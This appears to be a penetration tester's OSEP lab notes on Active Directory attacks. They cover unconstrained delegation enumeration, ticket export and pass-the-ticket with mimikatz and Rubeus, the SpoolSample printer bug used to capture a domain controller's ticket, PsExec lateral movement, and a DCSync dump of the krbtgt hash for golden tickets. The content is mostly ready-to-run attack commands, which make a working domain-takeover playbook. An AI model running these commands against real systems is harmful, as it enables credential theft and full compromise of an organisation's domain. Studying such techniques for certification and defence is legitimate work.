```
. .\powerview.ps1
Get-DomainComputer -Unconstrained
```

![[Pasted image 20210702212242.png]]

If unconstrained delegation enabled, we can capture ticket for any users and inject(In osep lab i had to login to another windows 10 client to capture admin ticket(Some kind of force authentication)):

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

```



```
mimikatz # kerberos::ptt  [0;17f185]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi

exit
```

Now try to login to domain controller with psExec:
```
PS C:\tools> C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
```

![[Pasted image 20210702235813.png]]

### The Printer Bug (Become domain controller)

Exploit Poc: https://github.com/leechristensen/SpoolSample

If printer service is running we should get response
```
PS C:\Tools> dir \\cdc01\pipe\spoolss
```

Now Run this command from Administrator CMD: 
```
C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$
```

Open another cmd and run the SpoolSample to get output in Rubeus CMD(Note: CDC01 is the target and APPSRV01 is the Current domain we are attacking from where where output will be sent):
```
> SpoolSample.exe CDC01 APPSRV01
```

From the Rubeus.exe cmd copy the tickets and inject into memory:
```
> Rubeus.exe ptt /ticket:rubes_output_ticket
```
![](Pasted%20image%2020210707154253.png)

If the domain controller(CDC01), not local administrator account we can't laterally move. But if it has replication permission, we can perform dcsync attack to dump hash. With the has we can create golden ticket to access any resource in the DC. Alternatively, we can dump the password hash of a member of the Domain Admins group:

```
mimikatz# lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```
